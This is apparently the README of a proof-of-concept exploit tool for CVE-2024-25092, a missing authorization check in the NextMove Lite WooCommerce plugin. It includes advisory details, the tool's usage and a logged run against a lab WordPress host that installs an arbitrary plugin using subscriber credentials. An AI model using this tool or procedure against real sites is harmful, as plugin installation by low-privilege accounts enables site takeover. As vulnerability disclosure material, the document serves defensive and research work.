# CVE-2024-25092
NextMove Lite &lt; 2.18.0 - Subscriber+ Arbitrary Plugin Installation/Activation


## Description:
The NextMove Lite – Thank You Page for WooCommerce plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the 'xl_addon_installation' function in all versions up to, and including, 2.17.0. This makes it possible for authenticated attackers, with subscriber access and above, to install and activate arbitrary plugins.

```
Severity: medium
CVE ID: CVE-2024-25092
CVSS Score: 6.5
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Plugin Slug: woo-thank-you-page-nextmove-lite
WPScan URL: https://www.wpscan.com/plugin/woo-thank-you-page-nextmove-lite
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/0b04ab77-880b-423a-bba6-59822f0463bc?source=api-prod
```

How to use
---

```
usage: CVE-2024-25092.py [-h] --url URL --username USERNAME --password PASSWORD --slug SLUG --php PHP

NextMove Lite – <= 2.17.0 - Missing Authorization to Authenticated(Subscriber+) Plugin Activation Description CVE-2024-25092 - The NextMove Lite – Thank You Page for WooCommerce plugin
for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the 'xl_addon_installation' function in all versions up to, and including, 2.17.0.
This makes it possible for authenticated attackers, with subscriber access and above, to install and activate arbitrary plugins.

options:
  -h, --help           show this help message and exit
  --url URL            URL of the WordPress site
  --username USERNAME  WordPress username
  --password PASSWORD  WordPress password
  --slug SLUG          WordPress Plugin Slug
  --php PHP            WordPress Plugin PHP file
```

POC
---

Not been able to activate for some reason.

```
python3 CVE-2024-25092.py --url http://wordpress.lan --user user --password useruser1 --slug ai-assistant-by-10web --php ai-assistant-by-10web/ai-assistant-by-10web.php
Logged in successfully.
Getting REST API Nonce!
Nonce Found: 905413f8f8
Installing Plugin
Downloading installation package from https://downloads.wordpress.org/plugin/ai-assistant-by-10web.1.0.19.zip
Unpacking the package
Installing the plugin
Plugin installed successfully.
{"success":false,"data":"Failed to activate plugin."}
```

